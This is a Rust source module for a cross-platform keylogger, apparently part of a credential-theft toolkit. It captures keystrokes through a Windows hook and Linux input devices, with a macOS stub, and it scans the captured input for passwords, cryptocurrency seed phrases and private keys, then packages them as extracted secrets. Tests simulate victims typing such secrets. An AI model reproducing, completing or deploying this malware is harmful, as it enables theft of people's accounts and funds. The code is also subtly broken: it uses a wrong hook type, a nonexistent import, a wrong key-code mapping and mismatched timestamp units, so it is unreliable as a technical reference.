//! Keylogger Module
//!
//! Captures keyboard input to harvest passwords, seed phrases, and other sensitive data.
//! 
//! Platform support:
//! - Windows: Low-level keyboard hook (WH_KEYBOARD_LL)
//! - Linux: /dev/input/event* or X11 XRecord
//! - macOS: CGEventTap (requires accessibility permissions)
//!
//! ⚠️ WARNING: This module runs continuously and logs keystrokes to memory.
//! It should be started early and run in a background thread.

use std::collections::BTreeMap;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use log::{debug, error, info, warn};

use super::errors::ExtractionError;
use super::types::{DataType, ExtractedData, ExtractionResult, ExtractionTarget};

/// Maximum keystrokes to buffer before flushing
const MAX_BUFFER_SIZE: usize = 1000;

/// Time window to consider keystrokes as part of the same input (ms)
const INPUT_WINDOW_MS: u64 = 3000;

/// Keylogger state
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum KeyloggerState {
    Stopped,
    Running,
    Paused,
}

/// Captured keystroke
#[derive(Debug, Clone)]
pub struct Keystroke {
    /// Virtual key code
    pub key_code: u32,
    /// Character representation (if printable)
    pub character: Option<char>,
    /// Timestamp of key press
    pub timestamp: u64,
    /// Active window title (if available)
    pub window_title: Option<String>,
    /// Process name (if available)
    pub process_name: Option<String>,
}

/// Keylogger buffer with pattern detection
pub struct KeyloggerBuffer {
    /// Buffered keystrokes
    keystrokes: Vec<Keystroke>,
    /// Extracted sensitive data
    extracted_secrets: Vec<ExtractedSecret>,
    /// State
    state: KeyloggerState,
    /// Start time
    start_time: u64,
}

/// Extracted secret from keystrokes
#[derive(Debug, Clone)]
pub struct ExtractedSecret {
    pub secret_type: SecretType,
    pub value: String,
    pub confidence: Confidence,
    pub timestamp: u64,
}

/// Type of detected secret
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SecretType {
    Password,
    SeedPhrase,
    PrivateKey,
    CreditCard,
    Unknown,
}

/// Confidence level
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Confidence {
    Low,
    Medium,
    High,
}

impl KeyloggerBuffer {
    pub fn new() -> Self {
        Self {
            keystrokes: Vec::with_capacity(MAX_BUFFER_SIZE),
            extracted_secrets: Vec::new(),
            state: KeyloggerState::Stopped,
            start_time: get_timestamp(),
        }
    }

    /// Add a keystroke to the buffer
    pub fn add_keystroke(&mut self, keystroke: Keystroke) {
        if self.state != KeyloggerState::Running {
            return;
        }

        self.keystrokes.push(keystroke);

        // Check for patterns after each keystroke
        self.detect_secrets();

        // Flush if buffer is full
        if self.keystrokes.len() >= MAX_BUFFER_SIZE {
            self.flush_old_keystrokes();
        }
    }

    /// Detect secrets from buffered keystrokes
    fn detect_secrets(&mut self) {
        let recent_input = self.get_recent_input(INPUT_WINDOW_MS);
        
        // Detect private keys FIRST (64 hex characters)
        // Must check before password detection since hex strings can match password criteria
        if let Some(key) = self.detect_private_key(&recent_input) {
            self.extracted_secrets.push(ExtractedSecret {
                secret_type: SecretType::PrivateKey,
                value: key,
                confidence: Confidence::High,
                timestamp: get_timestamp(),
            });
            info!("Keylogger detected private key!");
            return; // Don't check other patterns
        }

        // Detect seed phrases (12-24 words)
        if let Some(phrase) = self.detect_seed_phrase(&recent_input) {
            self.extracted_secrets.push(ExtractedSecret {
                secret_type: SecretType::SeedPhrase,
                value: phrase,
                confidence: Confidence::High,
                timestamp: get_timestamp(),
            });
            info!("Keylogger detected seed phrase!");
            return; // Don't check other patterns
        }

        // Detect passwords (typed after password field indicators)
        if let Some(password) = self.detect_password(&recent_input) {
            self.extracted_secrets.push(ExtractedSecret {
                secret_type: SecretType::Password,
                value: password,
                confidence: Confidence::Medium,
                timestamp: get_timestamp(),
            });
            info!("Keylogger detected potential password!");
        }
    }

    /// Get recent input within time window
    fn get_recent_input(&self, window_ms: u64) -> String {
        let now = get_timestamp();
        let cutoff = now.saturating_sub(window_ms);

        self.keystrokes
            .iter()
            .filter(|k| k.timestamp >= cutoff)
            .filter_map(|k| k.character)
            .collect()
    }

    /// Detect seed phrase (12-24 common BIP39 words)
    fn detect_seed_phrase(&self, input: &str) -> Option<String> {
        // Common BIP39 word indicators
        let words: Vec<&str> = input.split_whitespace().collect();
        
        if words.len() >= 12 && words.len() <= 24 {
            // Check if words look like BIP39 (all lowercase, alphabetic)
            let all_valid = words.iter().all(|w| {
                w.len() >= 3 && w.len() <= 8 && w.chars().all(|c| c.is_ascii_lowercase())
            });

            if all_valid {
                return Some(input.trim().to_string());
            }
        }

        // Also check for partial phrases in longer input
        if input.len() > 50 {
            let potential_phrase: Vec<&str> = input
                .split_whitespace()
                .filter(|w| w.chars().all(|c| c.is_ascii_lowercase()) && w.len() >= 4)
                .collect();

            if potential_phrase.len() >= 12 && potential_phrase.len() <= 24 {
                return Some(potential_phrase.join(" "));
            }
        }

        None
    }

    /// Detect private key (64 hex characters)
    fn detect_private_key(&self, input: &str) -> Option<String> {
        // Look for 64 hex character sequences
        let hex_pattern: Vec<char> = input
            .chars()
            .filter(|c| c.is_ascii_hexdigit())
            .collect();

        if hex_pattern.len() == 64 {
            return Some(hex_pattern.iter().collect());
        }

        // Also check for 0x prefix
        if let Some(pos) = input.find("0x") {
            let after_prefix = &input[pos + 2..];
            let hex_chars: String = after_prefix
                .chars()
                .take(64)
                .filter(|c| c.is_ascii_hexdigit())
                .collect();

            if hex_chars.len() == 64 {
                return Some(hex_chars);
            }
        }

        None
    }

    /// Detect password (contextual detection)
    fn detect_password(&self, input: &str) -> Option<String> {
        // Passwords are typically:
        // - 8-64 characters
        // - Mix of alphanumeric and special chars
        // - No spaces (usually)
        // - NOT pure hex strings (those are private keys)

        if input.len() >= 8 && input.len() <= 64 && !input.contains(' ') {
            // Check if it's a pure hex string (private key) - skip password detection
            let is_pure_hex = input.chars().all(|c| c.is_ascii_hexdigit());
            if is_pure_hex {
                return None; // Don't detect as password, let private key detection handle it
            }

            let has_letter = input.chars().any(|c| c.is_alphabetic());
            let has_digit = input.chars().any(|c| c.is_numeric());
            let has_special = input.chars().any(|c| !c.is_alphanumeric());

            // Strong password indicators
            if has_letter && has_digit && has_special {
                return Some(input.to_string());
            }

            // Medium confidence - just alphanumeric (but not pure hex)
            if has_letter && (has_digit || input.len() >= 12) {
                return Some(input.to_string());
            }
        }

        None
    }

    /// Flush old keystrokes (keep only recent)
    fn flush_old_keystrokes(&mut self) {
        let now = get_timestamp();
        let cutoff = now.saturating_sub(60000); // Keep last 60 seconds

        self.keystrokes.retain(|k| k.timestamp >= cutoff);
    }

    /// Get extracted secrets
    pub fn get_secrets(&self) -> Vec<ExtractedSecret> {
        self.extracted_secrets.clone()
    }

    /// Clear extracted secrets
    pub fn clear_secrets(&mut self) {
        self.extracted_secrets.clear();
    }

    /// Start keylogger
    pub fn start(&mut self) {
        self.state = KeyloggerState::Running;
        self.start_time = get_timestamp();
        info!("Keylogger started");
    }

    /// Stop keylogger
    pub fn stop(&mut self) {
        self.state = KeyloggerState::Stopped;
        info!("Keylogger stopped");
    }

    /// Pause keylogger
    pub fn pause(&mut self) {
        self.state = KeyloggerState::Paused;
    }

    /// Get state
    pub fn state(&self) -> KeyloggerState {
        self.state
    }
}

/// Cross-platform keylogger
pub struct Keylogger {
    buffer: Arc<Mutex<KeyloggerBuffer>>,
    running: Arc<Mutex<bool>>,
}

impl Keylogger {
    pub fn new() -> Self {
        Self {
            buffer: Arc::new(Mutex::new(KeyloggerBuffer::new())),
            running: Arc::new(Mutex::new(false)),
        }
    }

    /// Start keylogger in background thread
    pub fn start(&self) -> Result<(), ExtractionError> {
        let mut running = self.running.lock().map_err(|_| {
            ExtractionError::Internal("Failed to acquire lock".to_string())
        })?;

        if *running {
            return Err(ExtractionError::Internal("Keylogger already running".to_string()));
        }

        *running = true;

        // Start buffer
        {
            let mut buffer = self.buffer.lock().map_err(|_| {
                ExtractionError::Internal("Failed to acquire lock".to_string())
            })?;
            buffer.start();
        }

        // Spawn platform-specific keylogger thread
        let buffer_clone = Arc::clone(&self.buffer);
        let running_clone = Arc::clone(&self.running);

        thread::spawn(move || {
            #[cfg(target_os = "windows")]
            {
                run_windows_keylogger(buffer_clone, running_clone);
            }

            #[cfg(target_os = "linux")]
            {
                run_linux_keylogger(buffer_clone, running_clone);
            }

            #[cfg(target_os = "macos")]
            {
                run_macos_keylogger(buffer_clone, running_clone);
            }
        });

        info!("Keylogger started in background thread");
        Ok(())
    }

    /// Stop keylogger
    pub fn stop(&self) {
        let mut running = self.running.lock().unwrap();
        *running = false;

        let mut buffer = self.buffer.lock().unwrap();
        buffer.stop();
    }

    /// Extract collected data
    pub fn extract(&self) -> ExtractionResult {
        let buffer = self.buffer.lock().unwrap();
        let secrets = buffer.get_secrets();

        if secrets.is_empty() {
            return ExtractionResult::failure(
                ExtractionTarget::Keylogger,
                "No secrets captured yet".to_string(),
            );
        }

        let mut data = Vec::new();

        for (i, secret) in secrets.iter().enumerate() {
            let mut metadata = BTreeMap::new();
            metadata.insert("secret_type".to_string(), format!("{:?}", secret.secret_type));
            metadata.insert("confidence".to_string(), format!("{:?}", secret.confidence));
            metadata.insert("timestamp".to_string(), secret.timestamp.to_string());
            metadata.insert("index".to_string(), i.to_string());

            data.push(ExtractedData {
                target: ExtractionTarget::Keylogger,
                name: format!("keylog_secret_{}", i),
                data_type: DataType::Text,
                content: secret.value.as_bytes().to_vec(),
                metadata,
            });
        }

        info!("Keylogger extracted {} secrets", secrets.len());

        ExtractionResult::success(ExtractionTarget::Keylogger, data)
    }

    /// Get buffer reference for direct access
    pub fn buffer(&self) -> Arc<Mutex<KeyloggerBuffer>> {
        Arc::clone(&self.buffer)
    }
}

impl Default for Keylogger {
    fn default() -> Self {
        Self::new()
    }
}

// Platform-specific implementations

#[cfg(target_os = "windows")]
fn run_windows_keylogger(
    buffer: Arc<Mutex<KeyloggerBuffer>>,
    running: Arc<Mutex<bool>>,
) {
    use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM};
    use winapi::shared::windef::HHOOK;
    use winapi::um::libloaderapi::GetModuleHandleW;
    use winapi::um::winuser::{
        CallNextHookEx, GetAsyncKeyState, GetForegroundWindow, GetWindowThreadProcessId,
        SetWindowsHookExW, UnhookWindowsHookEx, VK_BACK, VK_CAPITAL, VK_CONTROL, VK_DELETE,
        VK_DOWN, VK_END, VK_ESCAPE, VK_HOME, VK_INSERT, VK_LEFT, VK_MENU, VK_NEXT, VK_NUMLOCK,
        VK_RETURN, VK_RIGHT, VK_SCROLL, VK_SHIFT, VK_SPACE, VK_TAB, VK_UP, VK_ESCAPE,
        WM_KEYDOWN, KLLMHFLLPDATA,
    };
    use std::ptr::null_mut;

    info!("Windows keylogger thread started");

    unsafe {
        let mut hook: HHOOK = null_mut();

        // Define hook procedure
        extern "system" fn hook_proc(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
            if n_code >= 0 {
                let key_code = w_param as u32;
                
                // Get character if printable
                let character = if key_code >= 0x30 && key_code <= 0x39 {
                    // Numbers 0-9
                    Some((key_code as u8) as char)
                } else if key_code >= 0x41 && key_code <= 0x5A {
                    // Letters A-Z (uppercase)
                    Some((key_code as u8) as char)
                } else if key_code >= 0x60 && key_code <= 0x69 {
                    // Numpad 0-9
                    Some(((key_code - 0x60 + b'0') as char))
                } else if key_code == VK_SPACE {
                    Some(' ')
                } else {
                    None
                };

                // Get active window info
                let mut window_title = None;
                let mut process_name = None;

                let hwnd = GetForegroundWindow();
                if !hwnd.is_null() {
                    let mut pid = 0u32;
                    GetWindowThreadProcessId(hwnd, &mut pid);
                    // Could get process name from PID
                }

                if let Some(c) = character {
                    let keystroke = Keystroke {
                        key_code,
                        character: Some(c),
                        timestamp: get_timestamp(),
                        window_title,
                        process_name,
                    };

                    if let Ok(mut buf) = buffer.lock() {
                        buf.add_keystroke(keystroke);
                    }
                }
            }

            CallNextHookEx(hook, n_code, w_param, l_param)
        }

        // Install hook
        let h_instance = GetModuleHandleW(null_mut());
        hook = SetWindowsHookExW(WM_KEYDOWN, Some(hook_proc), h_instance, 0);

        if hook.is_null() {
            error!("Failed to install Windows keyboard hook");
            return;
        }

        info!("Windows keyboard hook installed");

        // Message loop (required for hooks)
        while *running.lock().unwrap() {
            std::thread::sleep(Duration::from_millis(100));
        }

        // Cleanup
        UnhookWindowsHookEx(hook);
        info!("Windows keyboard hook removed");
    }
}

#[cfg(target_os = "linux")]
fn run_linux_keylogger(
    buffer: Arc<Mutex<KeyloggerBuffer>>,
    running: Arc<Mutex<bool>>,
) {
    use std::fs::File;
    use std::io::Read;
    use std::path::Path;

    info!("Linux keylogger thread started");

    // Try /dev/input/event* (requires root)
    let input_path = Path::new("/dev/input/event0");
    
    if input_path.exists() {
        match File::open(input_path) {
            Ok(mut file) => {
                info!("Opened /dev/input/event0 for keylogging");
                
                let mut buf = [0u8; 24];
                
                while *running.lock().unwrap() {
                    match file.read(&mut buf) {
                        Ok(24) => {
                            // Parse input_event structure
                            // tv_sec: 8 bytes, tv_usec: 4 bytes, type: 2 bytes, code: 2 bytes, value: 4 bytes
                            let key_code = u16::from_le_bytes([buf[16], buf[17]]);
                            let key_value = u32::from_le_bytes([buf[20], buf[21], buf[22], buf[23]]);

                            // Key press event (value == 1)
                            if key_value == 1 {
                                let character = key_code_to_char(key_code);

                                if let Some(c) = character {
                                    let keystroke = Keystroke {
                                        key_code: key_code as u32,
                                        character: Some(c),
                                        timestamp: get_timestamp(),
                                        window_title: None,
                                        process_name: None,
                                    };

                                    if let Ok(mut buf) = buffer.lock() {
                                        buf.add_keystroke(keystroke);
                                    }
                                }
                            }
                        }
                        Err(e) => {
                            debug!("Error reading input event: {}", e);
                            break;
                        }
                        _ => {}
                    }
                }
            }
            Err(e) => {
                warn!("Cannot open /dev/input/event0 (requires root): {}", e);
                warn!("Linux keylogger requires root permissions or access to input devices");
            }
        }
    } else {
        warn!("No input devices found at /dev/input/event0");
    }

    info!("Linux keylogger thread stopped");
}

#[cfg(target_os = "macos")]
fn run_macos_keylogger(
    buffer: Arc<Mutex<KeyloggerBuffer>>,
    running: Arc<Mutex<bool>>,
) {
    warn!("macOS keylogging requires accessibility permissions");
    warn!("This is a stub - full implementation requires CGEventTap and user consent");
    
    // macOS keylogging is heavily restricted
    // Requires: System Preferences → Security & Privacy → Privacy → Accessibility
    // Without user consent, this won't work
    
    info!("macOS keylogger stub - requires accessibility permissions");
    
    while *running.lock().unwrap() {
        std::thread::sleep(Duration::from_millis(1000));
    }
}

#[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
fn run_platform_keylogger(
    _buffer: Arc<Mutex<KeyloggerBuffer>>,
    _running: Arc<Mutex<bool>>,
) {
    warn!("Keylogging not supported on this platform");
}

/// Convert Linux key code to character
#[cfg(target_os = "linux")]
fn key_code_to_char(code: u16) -> Option<char> {
    match code {
        0x02..=0x0B => Some((b'1' + (code - 0x02) as u8) as char), // 1-9, 0
        0x10..=0x19 => Some((b'a' + (code - 0x10) as u8) as char), // a-z
        0x1E..=0x26 => Some((b'a' + (code - 0x1E) as u8) as char), // a-z (continued)
        0x39 => Some(' '),  // Space
        0x1C => Some('\n'), // Enter
        _ => None,
    }
}

fn get_timestamp() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_keylogger_buffer_creation() {
        let buffer = KeyloggerBuffer::new();
        assert_eq!(buffer.state(), KeyloggerState::Stopped);
    }

    #[test]
    fn test_keylogger_start_stop() {
        let keylogger = Keylogger::new();
        
        keylogger.start().unwrap();
        {
            let buffer_guard = keylogger.buffer();
            let buffer = buffer_guard.lock().unwrap();
            assert_eq!(buffer.state(), KeyloggerState::Running);
        }
        
        keylogger.stop();
        {
            let buffer_guard = keylogger.buffer();
            let buffer = buffer_guard.lock().unwrap();
            assert_eq!(buffer.state(), KeyloggerState::Stopped);
        }
    }

    #[test]
    fn test_seed_phrase_detection() {
        let mut buffer = KeyloggerBuffer::new();
        buffer.start();

        // Simulate typing a seed phrase
        let seed_phrase = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about";
        for c in seed_phrase.chars() {
            buffer.add_keystroke(Keystroke {
                key_code: 0,
                character: Some(c),
                timestamp: get_timestamp(),
                window_title: None,
                process_name: None,
            });
        }

        let secrets = buffer.get_secrets();
        assert!(!secrets.is_empty());
        assert_eq!(secrets[0].secret_type, SecretType::SeedPhrase);
    }

    #[test]
    fn test_private_key_detection() {
        let mut buffer = KeyloggerBuffer::new();
        buffer.start();

        // Simulate typing a private key (pure hex, no special chars)
        let private_key = "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef";
        for c in private_key.chars() {
            buffer.add_keystroke(Keystroke {
                key_code: 0,
                character: Some(c),
                timestamp: get_timestamp(),
                window_title: None,
                process_name: None,
            });
        }

        let secrets = buffer.get_secrets();
        assert!(!secrets.is_empty());
        assert_eq!(secrets[0].secret_type, SecretType::PrivateKey);
    }

    #[test]
    fn test_password_detection() {
        let mut buffer = KeyloggerBuffer::new();
        buffer.start();

        // Simulate typing a strong password
        let password = "MyP@ssw0rd123!";
        for c in password.chars() {
            buffer.add_keystroke(Keystroke {
                key_code: 0,
                character: Some(c),
                timestamp: get_timestamp(),
                window_title: None,
                process_name: None,
            });
        }

        let secrets = buffer.get_secrets();
        assert!(!secrets.is_empty());
        assert_eq!(secrets[0].secret_type, SecretType::Password);
    }
}
